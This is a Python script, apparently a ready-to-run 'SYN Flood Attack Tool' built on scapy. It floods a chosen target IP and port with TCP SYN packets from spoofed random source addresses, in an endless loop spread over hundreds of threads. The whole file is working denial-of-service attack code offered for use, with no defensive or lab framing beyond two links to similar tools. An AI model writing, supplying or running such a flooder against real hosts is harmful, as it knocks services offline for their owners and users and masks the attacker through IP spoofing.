import argparse
import threading
from scapy.all import *
from random import randint

def randomIP():
    ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
    return ip


def randInt():
    x = randint(1000,9000)
    return x

# SYN flood attack function
def syn_flood(target, port, threads, i):
    print("Starting SYN flood on", target, "using", threads, "threads")

    try:
        while True:
            # Send SYN packet using scapy's send function
            s_port = randInt()
            s_eq = randInt()
            w_indow = randInt()

            IP_Packet = IP()
            IP_Packet.src = randomIP()
            IP_Packet.dst = target

            TCP_Packet = TCP()
            TCP_Packet.sport = s_port
            TCP_Packet.dport = port
            TCP_Packet.flags = "S"
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow

            send(IP_Packet / TCP_Packet, verbose=0)
            print(datetime.now().isoformat() + ': sent packet - thread ' + str(i))

    except Exception as e:
        print("Error sending SYN packet:", str(e))


def main():
    parser = argparse.ArgumentParser(description="SYN Flood Attack Tool")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--threads", type=int, default=500, help="Number of threads (default: 500)")

    args = parser.parse_args()

    # Resolve target DNS name
    target_ip = args.target

    # Launch SYN flood threads
    for i in range(args.threads):
        thread = threading.Thread(target=syn_flood, args=(target_ip, args.port, args.threads, i))
        thread.start()


if __name__ == "__main__":
    main()

# sources:
# https://github.com/brian404/SYN-flood/blob/main/syn.py
# https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool/blob/master/py3_SYN-Flood.py